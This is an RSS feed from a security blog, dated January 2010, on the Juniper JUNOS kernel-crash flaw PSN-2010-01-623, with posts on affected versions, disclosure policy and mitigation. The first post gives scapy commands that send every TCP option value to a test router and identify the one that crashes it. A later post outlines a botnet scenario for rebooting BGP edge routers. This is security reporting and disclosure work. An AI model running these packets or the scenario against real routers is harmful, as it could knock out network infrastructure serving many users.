<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Praetorian Prefect on Jeremy Rossi</title>
    <link>https://jeremyrossi.com/series/praetorian-prefect/</link>
    <description>Recent content in Praetorian Prefect on Jeremy Rossi</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 10 Jan 2010 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://jeremyrossi.com/series/praetorian-prefect/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Juniper Kernel Crash - scapy Code</title>
      <link>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</link>
      <pubDate>Sun, 10 Jan 2010 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2010/01/10/juniper-kernel-crash---scapy-code/</guid>
      <description>&lt;p&gt;On January 6th, we wrote about &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;a JUNOS flaw&lt;/a&gt;
that caused a kernel crash in Juniper routers and demonstrated
the &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-kernel-crash-video/&#34;&gt;effect in action&lt;/a&gt;
in a video. At the time Juniper was not making details of the advisory public, however since
then &lt;a href=&#34;http://osvdb.org/ref/61/juniper-PSN-2010-01-623.txt&#34;&gt;PSN-2010-01-623&lt;/a&gt; has shown up on
the Open Source Vulnerability Database under entry &lt;a href=&#34;http://osvdb.org/61538&#34;&gt;61538&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Following the Juniper kernel flaw posts, we received a number of inquiries regarding how
to determine the option value to use, however we were somewhat reluctant to provide
that level of detail. Now that &lt;a href=&#34;http://evilrouters.net/2010/01/09/junos-psn-2010-01-623-exploit/&#34;&gt;exploit code has been published&lt;/a&gt;
elsewhere, there is little reason not to answer this question.&lt;/p&gt;

&lt;p&gt;To test all possible TCP options using &lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;scapy&lt;/a&gt;
(a python based packet manipulation program), first download the latest copy of
scapy (including all library dependencies) from their
&lt;a href=&#34;http://hg.secdev.org/scapy/&#34;&gt;Mercurial code repository&lt;/a&gt; as shown below:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ hg clone http://hg.secdev.org/scapy/
$ cd scapy
$ python setup build
$ sudo python setup install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Start scapy as root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;$ sudo run_scapy
INFO: Can&#39;t import python gnuplot wrapper . Won&#39;t be able to plot.
INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().
WARNING: No route found for IPv6 destination :: (no default route?)
Welcome to Scapy (2.1.0-dev)
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We started this particular test by first creating an IP packet with a destination of the Juniper test router instance named &amp;lsquo;ipl&amp;rsquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ipl = IP(dst=&amp;quot;172.17.20.102&amp;quot;)
&amp;gt;&amp;gt;&amp;gt; ipl
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Initially we tested all TCP options as fast as possible just to see if it was possible to reproduce the
reported vulnerability (a kernel crash that causes the router to reboot).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; send([ipl/TCP(dport=23, options=[(x, &amp;quot;&amp;quot;)])/&amp;quot;bye bye&amp;quot; for x in range(256)])
................................................................................................................
................................................................................................................
................................
Sent 256 packets.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The previous command created 255 packets with every possible TCP option, sent them all
at once, and the router crashed. While this performed as expected, it only told us
that we were on the right track (the advisory was correct, an option setting
crashes the router), however it does not tell us which option.&lt;/p&gt;

&lt;p&gt;The scapy tool can send a ping following each test packet to see if the router
is still up and responding, as demonstrated:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; for x in range(255):
...   send(ipl/TCP(dport=&amp;quot;22&amp;quot;, options=[(x,&amp;quot;&amp;quot;)])
...   if not sr1(/ICMP(), retry=-1, timeout=1, verbose=0):
...     print &amp;quot;we have a winner: %s&amp;quot;%(x)
...     break
...
we have a winner: 101
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that we have a winner, we know which option value caused the kernel crash
Juniper reported.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>JUNOS (Juniper) Flaw Exposes Core Routers to Kernel Crash</title>
      <link>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-flaw-exposes-core-routers-to-kernel-crash/</link>
      <pubDate>Thu, 07 Jan 2010 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-flaw-exposes-core-routers-to-kernel-crash/</guid>
      <description>

&lt;p&gt;A report has been received from Juniper at 4:25pm under bulletin PSN-2010-01-623 that a
crafted malformed TCP field option in the TCP header of a packet will cause the JUNOS kernel
to core (crash). In other words the kernel on the network device (gateway router) will
crash and reboot if a packet containing this crafted option is received on a listening
TCP port. The JUNOS firewall filter is unable to filter a TCP packet with this issue.
Juniper claims this issue as exploit was identified during investigation of a vendor
interoperability issue.&lt;/p&gt;

&lt;p&gt;There is talk that backbone Internet providers have been quickly patching this issue
since yesterday night.&lt;/p&gt;

&lt;h3 id=&#34;tcp-header-option-space:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;TCP Header Option Space&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Options occupy space at the end of the TCP header. All options are included in the
checksum. An option may begin on any byte boundary. The TCP header must be padded with
zeros to make the header length a multiple of 32 bits.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;(Source: &lt;a href=&#34;http://www.networksorcery.com/enp/protocol/tcp.htm&#34;&gt;http://www.networksorcery.com/enp/protocol/tcp.htm&lt;/a&gt;)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;[caption id=&amp;ldquo;attachment_2819&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;300&amp;rdquo; caption=&amp;ldquo;The TCP Header&amp;rdquo;]&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/tcp_header1.jpg&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/tcp_header1-300x124.jpg&#34; alt=&#34;The TCP Header&#34; title=&#34;tcp_header1&#34; width=&#34;300&#34; height=&#34;124&#34; class=&#34;size-medium wp-image-2819&#34; /&gt;&lt;/a&gt;[/caption]
Source: &lt;a href=&#34;http://www.software-engineer-training.com/wp-content/uploads/2007/12/tcp_header.png&#34;&gt;http://www.software-engineer-training.com/wp-content/uploads/2007/12/tcp_header.png&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;the-kernel:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;The Kernel&lt;/h3&gt;

&lt;p&gt;At a high level, the kernel in an operating system serves as the bridge between applications
and the actual data processing of the hardware the OS is running on. The kernel manages
system resources and abstracts resources that applications must access.&lt;/p&gt;

&lt;p&gt;[caption id=&amp;ldquo;attachment_2837&amp;rdquo; align=&amp;ldquo;alignnone&amp;rdquo; width=&amp;ldquo;300&amp;rdquo; caption=&amp;ldquo;Basic Kernel Representation&amp;rdquo;]&lt;a href=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/kernel.png&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2010/01/kernel-300x237.png&#34; alt=&#34;Basic Kernel Representation&#34; title=&#34;kernel&#34; width=&#34;300&#34; height=&#34;237&#34; class=&#34;size-medium wp-image-2837&#34; /&gt;&lt;/a&gt;[/caption]&lt;/p&gt;

&lt;h3 id=&#34;affected-devices:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Affected Devices&lt;/h3&gt;

&lt;p&gt;It is basically all of them save the more recent version. If you&amp;rsquo;ve installed a device
with a JUNOS release version released later then 1/28/09, this issue is already
corrected. Apparently the original issue and its correction did not conceive of this
problem as a security vulnerability, and thus the criticality of applying the patch
was not initially understood until this week.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;JUNOS 10.x  (Removed from the bulletin today, 01/07/09, so assumed to not be affected)&lt;/li&gt;
&lt;li&gt;JUNOS 9.x&lt;/li&gt;
&lt;li&gt;JUNOS 7.x&lt;/li&gt;
&lt;li&gt;JUNOS 8.x&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Please note the versions below were removed from the bulletin today, 01/07/09. This
is likely because, as Matt pointed out below, these
&lt;a href=&#34;http://www.juniper.net/support/eol/junos.html&#34;&gt;are end of life versions&lt;/a&gt; of the
OS (meaning likely still vulnerable if you happen to be running them, but out of
scope for Juniper because from their standpoint these should already have been
upgraded).&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;JUNOS 6.x&lt;/li&gt;
&lt;li&gt;JUNOS 5.x&lt;/li&gt;
&lt;li&gt;JUNOS 3.x&lt;/li&gt;
&lt;li&gt;JUNOS 4.x&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;juniper-s-advice:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Juniper&amp;rsquo;s Advice&lt;/h3&gt;

&lt;p&gt;Juniper references best common practice (BCP) 38, a methodology for reducing the amount
of bad packets being forwarded by network devices (basically prohibiting packets where
the originator can&amp;rsquo;t effectively be identified), as a possible mitigating control.&lt;/p&gt;

&lt;p&gt;However there is no completely effective workaround available other then upgrading the OS.&lt;/p&gt;

&lt;h3 id=&#34;update:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Update&lt;/h3&gt;

&lt;p&gt;Juniper responded to &lt;a href=&#34;http://www.theregister.co.uk/2010/01/07/juniper_critical_router_bug/&#34;&gt;the Register&lt;/a&gt;
as follows:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;that the bulletin was one of seven security advisories the company issued
under a policy designed to prevent members of the public at large from getting details
of the vulnerabilities.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&amp;ldquo;Because of Juniper&amp;rsquo;s &amp;lsquo;Entitled Disclosure Policy,&amp;rsquo; only our customers and partners
are allowed access to the details of the Security Advisory,&amp;rdquo;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Juniper spokeswoman&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;Interesting approach, and probably would be better received if vulnerabilities only
affected those entitled. Unfortunately the networks that run high end Juniper equipment
serve a great many end users, and thus in this case the general public would probably
like some informed background. At the point the media is contacting you, it is safe to
say the &amp;ldquo;cat is out of the bag&amp;rdquo;. And this is the response from a company that is a
strong player in the information security appliance space?&lt;/p&gt;

&lt;p&gt;The flip side is that the Juniper response to this issue from a technical perspective
has appeared to be at first glance fairly comprehensive, a PR opportunity if managed
correctly.&lt;/p&gt;

&lt;p&gt;And yes, this is the same firm that feels &lt;a href=&#34;http://www.theregister.co.uk/2009/06/30/atm_talk_canceled/&#34;&gt;this way&lt;/a&gt;
when it is they who are discussing the vulnerability of someone else&amp;rsquo;s product:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Juniper believes that Jack&amp;rsquo;s research (on ATM vulnerabilities) is important to be
presented in a public forum in order to advance the state of security,&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We agree with the second Juniper: more education, especially after the problem
has been corrected, is better.&lt;/p&gt;

&lt;h3 id=&#34;finally:9715789817c7e41c1c98f33ef9b6bb90&#34;&gt;Finally&lt;/h3&gt;

&lt;p&gt;More information will be posted as it becomes available. This was a serious issue
which appears to have been averted through a coordinated response. Essentially, given
the core equipment (big Telco routers) running &amp;ldquo;Big Iron&amp;rdquo; type Juniper network
devices, portions of the Internet could have gone black with a successful implementation
of this exploit. Routers at this level are not patched like your local Windows OS,
it takes something important to justify an outage. As previously noted, even though
the code problem itself was identified last year, it appears that the problem was
not identified as a mechanism for creating a remote exploit until now, raising the
criticality of patching the issue severely.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>JUNOS (Juniper) Kernel Crash Video</title>
      <link>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-kernel-crash-video/</link>
      <pubDate>Thu, 07 Jan 2010 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2010/01/07/junos-juniper-kernel-crash-video/</guid>
      <description>

&lt;p&gt;We have noted some interesting responses since &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/&#34;&gt;our post yesterday&lt;/a&gt;
detailing the information in Juniper bulletin PSN-2010-01-623 and our thoughts
on its somewhat understated effect. Since our post yesterday, the bulletin
has been updated, becoming more specific about the versions affected (basically
excluding JUNOS version 10.x and versions no longer supported by Juniper).
We&amp;rsquo;ve been quoted here and there saying that &lt;a href=&#34;http://www.theregister.co.uk/2010/01/07/juniper_critical_router_bug/&#34;&gt;the potential worst case scenario&lt;/a&gt;
with this flaw could have been widespread Internet outages (not overstatement in our opinion),
and that such a simple attack that escapes filtering and
&lt;a href=&#34;http://www.computerworld.com/s/article/9143342/Juniper_patches_router_crashing_bug&#34;&gt;can reboot high end routers is a big deal&lt;/a&gt;.
We have tested sending all 256 permutations of the Options field in the TCP header
to a vulnerable Juniper router operating system, found the correct value, and
reproduced the kernel crash, which is demonstrated in the video below.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.secdev.org/projects/scapy/&#34;&gt;SCAPY&lt;/a&gt; was used to send the packets used in the test.&lt;/p&gt;

&lt;p&gt;&lt;object width=&#34;700&#34; height=&#34;674&#34; classid=&#34;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&#34; codebase=&#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&#34;&gt;&lt;param name=&#34;allowfullscreen&#34; value=&#34;true&#34; /&gt;&lt;param name=&#34;allowscriptaccess&#34; value=&#34;always&#34; /&gt;&lt;param name=&#34;src&#34; value=&#34;http://vimeo.com/moogaloop.swf?clip_id=8606222&amp;amp;server=vimeo.com&amp;amp;show_title=0&amp;amp;show_byline=0&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&#34; /&gt;&lt;embed width=&#34;700&#34; height=&#34;674&#34; type=&#34;application/x-shockwave-flash&#34; src=&#34;http://vimeo.com/moogaloop.swf?clip_id=8606222&amp;amp;server=vimeo.com&amp;amp;show_title=0&amp;amp;show_byline=0&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&#34; allowfullscreen=&#34;true&#34; allowscriptaccess=&#34;always&#34; /&gt;&lt;/object&gt;&lt;/p&gt;

&lt;h3 id=&#34;responses-to-our-original-post:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Responses to Our Original Post&lt;/h3&gt;

&lt;h4 id=&#34;the-bizarre:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Bizarre&lt;/h4&gt;

&lt;p&gt;We&amp;rsquo;ve seen kind of off the wall responses, like this one:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;It seems like this isn&amp;rsquo;t as major as they say. Sure it&amp;rsquo;s a kernel crash, but
it requires a packet to be sent to a listening port. I doubt any core routers
have any ports open to the public internet at all.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order for a router to function as a router, some TCP ports must be open.
The BGP port will be open on a core router. So yes, a core router will not have
ports open to the public Internet. The BGP port however will be open to neighbors,
and a packet that cannot be filtered negates ACL rules preventing access by
anyone but neighbors. At a high level, that is how high end equipment is affected.&lt;/p&gt;

&lt;h4 id=&#34;the-official:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Official&lt;/h4&gt;

&lt;p&gt;We saw the response from Juniper we talked about yesterday repeated again today,
which continues to leave something to be desired: A Juniper spokeswoman declined
to provide more technical details on the issue, saying that the company only
passes on this information to customers and partners. The advisory was one of
seven issued recently by the company, she said via e-mail.&lt;/p&gt;

&lt;p&gt;Yes, there were seven advisories. Six were somewhat less interesting than one of them:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;PSN-2010-01-627 - RPD cores when injected with malformed PIM messages - (As it is not commonly used over the Internet, this issue is confined to the organizations that are running PIM internally)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-626 - BGP Malformed AS-4 Byte Transitive Attributes Drop BGP Sessions - (If you are running an affected version (there aren&amp;rsquo;t many), upgrade ASAP.)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-625 - Invalid RSVP packet causes RPD process busy loop and router becomes unresponsive - (RSVP is used almost excursively inside a services providers network as part of a larger MPLS Traffic Engineering solution. Due to the use of MPLS VPN&amp;rsquo;s, RSVP in this environment is not exposed to transit traffic or from within the VPN&amp;rsquo;s. The exposure of this is much lower.)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-624 - Unauthorized user can obtain root access using cli - (Any access escalation issue is a big problem, but in this case for routers, if someone else is able to login and get console access you have other problems that need to be addressed.)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-623 - JUNOS kernel cores when it receives an crafted TCP option. - (Not so good.)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-622 - as-path-prepend and specific length AS_PATH we can cause a Juniper to send corrupted update packets to eBGP neighbors - (BGP as-path-prepend router level configuration that can be corrected by making changes to the config.)&lt;/li&gt;
&lt;li&gt;PSN-2010-01-621 Crafted RSVP Path Object Overloads the RPD Process - (RSVP is used almost exclusively inside a service providers network as part of a larger MPLS Traffic Engineering solution. Due to the use of MPLS VPN&amp;rsquo;s RSVP in this environment is not exposed to transit traffic or from traffic within the VPN&amp;rsquo;s. The exposure of this problem is lower.)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;unofficial-but-from-juniper-anyway:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Unofficial, but from Juniper Anyway&lt;/h4&gt;

&lt;p&gt;We received &lt;a href=&#34;http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/#comments&#34;&gt;a response from Matt at Juniper in the comment section&lt;/a&gt;
of the original post, which we appreciated. He tightened the versions affected
information, by noting the mistake in the original Juniper bulletin that stated
version 10.x was affected.&lt;/p&gt;

&lt;p&gt;Again, thanks for the update Matt.&lt;/p&gt;

&lt;h4 id=&#34;another-unofficial-but-from-juniper-anyway:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Another Unofficial, but from Juniper Anyway&lt;/h4&gt;

&lt;p&gt;JuniperPhilly responds in the &lt;a href=&#34;http://forums.theregister.co.uk/forum/1/2010/01/07/juniper_critical_router_bug/&#34;&gt;comments of the Register article&lt;/a&gt; as follows:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;it&amp;rsquo;s probably not as bad as you might think- All Junos software releases built
on or after January 28, 2009 have fixed this specific issue. In short, we
fixed this particular problem about 350 days ago.
&amp;hellip;.
Disclaimer: I work for Juniper as a Systems Engineer.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Well, sort of. The criticality of the defect was certainly reclassified, so the fix
made a while back actually seems divorced from the discovery that this problem leads
to a kernel crash based on a remote exploit. The Juniper advisory itself reads this
way, suggesting that the fix was made without knowing that it was a fix for a remote
exploit. This is not that uncommon, problems are fixed for one reason, without ever
knowing there was an even better reason for correcting it.&lt;/p&gt;

&lt;p&gt;But routers, especially high capacity ones, are only patched for serious reasons. So
a defect identified but not reported in the same way back in January 2009 does not carry
the affect of releasing a bulletin labeled critical yesterday. The second makes people
maintaining those routers move, as the example below shows.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://news.qwest.com/company&#34;&gt;Qwest&lt;/a&gt;, like other backbone providers, doesn&amp;rsquo;t have
unannounced outages for unspecified security concerns over &amp;ldquo;not as bad as you might think&amp;rdquo;
issues:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Date: 2010-01-07 10:04:08 GMT (15 hours and 1 minute ago)
We just had a qwest outage of about 2 mins at 1:41am pst. When I called
to report it I was told it was a 200+ emergency software upgrade due to
a security concern, and that we will get a notice later after the fact.
Normally we get notices in advance, even for software upgrades due to
security or other important issues, so I am curious if other qwest
customers had the same experience and wether this is how it&amp;rsquo;s going to
be from here on in? The affected platform was juniper and I&amp;rsquo;d love to
know the specfic case being addressed here.&lt;/p&gt;

&lt;p&gt;Mike-&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Source: &lt;a href=&#34;http://thread.gmane.org/gmane.org.operators.nanog/71244&#34;&gt;http://thread.gmane.org/gmane.org.operators.nanog/71244&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This thread actually produced interesting responses regarding how the actual
notification was published after the outage:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;My QWest account manager called three different people at my business 7hrs before
the maintenance. Also mentioned the Juniper Security Advisories. - Joe&lt;/li&gt;
&lt;li&gt;We also got email notifications about &amp;lsquo;emergency maintenance&amp;rsquo; on our Qwest circuits,
from their notice: Reason For Maintenance: EMERGENCY MAINTENANCE TO IMPLEMENT A
SOFTWARE PATCH FOR NETWORK RELIABILITY - Ken&lt;/li&gt;
&lt;li&gt;Yeah, they refused to notify due to security concerns from what they told me
last night. Notification was performed after maintenance was complete. -Jack&lt;/li&gt;
&lt;li&gt;Same thing for us in Minnesota. Brief outage and emergency outage notification
came after the outage. -Dylan&lt;/li&gt;
&lt;li&gt;Notices were left at the discretion of Qwest account teams. There was no mass
notification. -Jason&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The thread link above contains this and the rest of this particular discussion.&lt;/p&gt;

&lt;h4 id=&#34;the-newsgroups:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;The Newsgroups&lt;/h4&gt;

&lt;p&gt;We were told the problem wasn&amp;rsquo;t corroborated by discussions in newsgroups. It started showing up today:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.org.operators.nanog/71244&#34;&gt;qwest outage no notice&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15350&#34;&gt;JUNOS vulnerability with malformed TCP packets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15366&#34;&gt;vulnerability fix not available for 8.5 ?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://thread.gmane.org/gmane.network.nsp.juniper/15356&#34;&gt;JUNOS vulnerability with malformed TCP packets&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;yeah-but-cisco-makes-the-core-routers:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Yeah but Cisco makes the Core Routers&lt;/h3&gt;

&lt;p&gt;Sigh&amp;hellip;&lt;/p&gt;

&lt;p&gt;Not to become public relations for Juniper, but:&lt;/p&gt;

&lt;p&gt;The innovations listed above, as well as many others, have helped the T Series become
the industry&amp;rsquo;s most widely deployed core routing family. Juniper has shipped over
5000 T Series to more than 220 customers around the world — including more than
500 T1600s in just over a year of availability. According to Synergy Research, in
the past five years, Juniper&amp;rsquo;s share of the core routing market has grown by 44
percent — with the company gaining 11 points of share as others have seen share
declines.&lt;/p&gt;

&lt;p&gt;Source: &lt;a href=&#34;http://www.juniper.net/us/en/company/press-center/press-releases/2009/pr_2009_06_08-09_00.html&#34;&gt;http://www.juniper.net/us/en/company/press-center/press-releases/2009/pr_2009_06_08-09_00.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And the following line from the same press release:&lt;/p&gt;

&lt;p&gt;All of these platforms are powered by JUNOS® Software, a single operating system integrating
routing, switching, security and network services from Juniper Networks.&lt;/p&gt;

&lt;h3 id=&#34;what-about-anti-spoofing-and-egress-filtering:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;What about Anti-spoofing and egress filtering&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;(Comments From: ANTON DELPORT)&lt;/p&gt;

&lt;p&gt;One thing that will also be required for a successful attacked would be spoofed IP packets.
Keep in mind that most ISP follow the best practice guidelines and implement ACL and
anti-spoofing. So yes, the router will listen to BGP port but only for a small range
of prefixes. If the source address (and destination) is not correct, the packet will
be dropped in hardware before it can do any damage.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Anti-spoofing and egress filtering as recommended by BCP 38 is to help mitigate this issue
for routers that are not at the edge. It does nothing to help the edge routers themselves.
Example:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Service provider Alice peers with service provider Bob in NYC.&lt;/li&gt;
&lt;li&gt;Alice&amp;rsquo;s edge router (&lt;code&gt;10.10.10.1/30&lt;/code&gt;) exchanges routes with Bob&amp;rsquo;s edge router (&lt;code&gt;10.10.10.2/30&lt;/code&gt;) via BGP&lt;/li&gt;
&lt;li&gt;Bad actor Charlie sends a JunOS rebooting packets from inside Alice&amp;rsquo;s network to &lt;code&gt;10.10.10.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The best path from with in Alice&amp;rsquo;s network to reaching &lt;code&gt;10.10.10.2&lt;/code&gt; will most likely be the peering connection in NYC.&lt;/li&gt;
&lt;li&gt;The packet will &lt;em&gt;NOT&lt;/em&gt; be stopped within Alice&amp;rsquo;s network as it has a valid return and destination address.&lt;/li&gt;
&lt;li&gt;Bob&amp;rsquo;s edge router is &lt;em&gt;NOT&lt;/em&gt; able to filter any of the JunOS rebooting packets due to ACL&amp;rsquo;s not having any effect on this issue.&lt;/li&gt;
&lt;li&gt;Even if the bad actor Charlie is several networks away from Bob, should his packet pass through Alice&amp;rsquo;s network, it will hit Bob&amp;rsquo;s edge and cause the same harm.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The reason why this issue is real is that I can identify border networks simply with &lt;code&gt;traceroute&lt;/code&gt;,
and I know that BGP is used to exchange routes. Given this information there is nothing to
protect providers if they are running an affected version of the software at the edge of their network.&lt;/p&gt;

&lt;h3 id=&#34;finally:b4f0b7eca0be3b56521d48b7f25ef0f6&#34;&gt;Finally&lt;/h3&gt;

&lt;p&gt;So people are attaching viewpoints to this problem that don&amp;rsquo;t entirely make sense. A high end
router is not the same as your local Microsoft Windows OS, it doesn&amp;rsquo;t get updated every month
following Tuesday, it gets updated when a network administrator determines there is a problem
severe enough to warrant an outage to make the patch update. Many of the &amp;ldquo;big iron&amp;rdquo; routers
that would have been affected had this been out in the wild (which as far as we know its not
yet) were not patched as of Monday, and from all appearances were patched as of late Tuesday.&lt;/p&gt;

&lt;p&gt;Juniper is a major player in the high end router market, it is not a one player market.
If an unpatched Juniper router were hit with this packet, it would crash.&lt;/p&gt;

&lt;p&gt;But let&amp;rsquo;s walk through a thought experiment for the &amp;ldquo;this wouldn&amp;rsquo;t have been a big deal
if uncorrected&amp;rdquo; crowd:&lt;/p&gt;

&lt;p&gt;Watch the video above, the OS reboot takes a while on a virtual machine (big routers take
longer). Imagine a bot net being rented to run the program that was developed for the video
above at a certain time (say midnight). Conceive of the bad actor identifying boundary
routers between service providers (traceroute), and sending the crafted packet to the BGP
port of both side&amp;rsquo;s IP addresses, rebooting boxes, and severing BGP connections. Even
after reboot, the effects are magnified as a BGP convergence happens globally.&lt;/p&gt;

&lt;p&gt;You can rent a decent size botnet on the Internet right now if you like. The program
above that found the right option to send took a couple hours to write (on and off
with other things going on), the actual option field that causes the problem identified
fairly quickly after that. The second program that sends the packet is just a small
python script.&lt;/p&gt;

&lt;p&gt;This hypothetical scenario would have been a long day on the old Intertubes. I&amp;rsquo;m
sure there are details to be worked out (if you crash enough gateways, can you continue
the attack?), but you get the idea.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s be realistic as we go into the automatic &amp;ldquo;nothing is ever really a big issue,
everything is FUD&amp;rdquo; reactive mode that so often follows news in information security.
Remote exploits are still bad. Ones that cause kernel crashes are still bad. Remote
exploits that cause kernel crashes in one of the most widely used network operating
systems in the world are bad. Identifying security issues that are critical, responding
to them appropriately, sending out bulletins with appropriate CVSS ratings, and
avoiding big potential problems like this, are good. We can&amp;rsquo;t call it a total win
(its not hard to find the option value, and so this could enter the wild shortly),
but it looks from the outside like large providers have taken preventative steps to
be prepared.&lt;/p&gt;

&lt;p&gt;And if anyone else noticed Twitter seemed to have its own blackout, of Juniper personnel,
as none of them have been tweeting a whole lot this week.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Ossec: Agentless....it&#39;s good, but not good enough. </title>
      <link>https://jeremyrossi.com/blog/2009/10/05/ossec-agentless....its-good-but-not-good-enough./</link>
      <pubDate>Mon, 05 Oct 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/10/05/ossec-agentless....its-good-but-not-good-enough./</guid>
      <description>

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;img src=&#34;http://praetorianprefect.com/wp-content/uploads/2009/11/Screen-shot-2009-11-02-at-8.06.14-PM.png&#34; border=&#34;1&#34; alt=&#34;ossec_logo&#34; width=&#34;66&#34; height=&#34;64&#34; /&gt;&lt;/div&gt;

&lt;p&gt;In working with OSSEC agentless for some time now I have come across
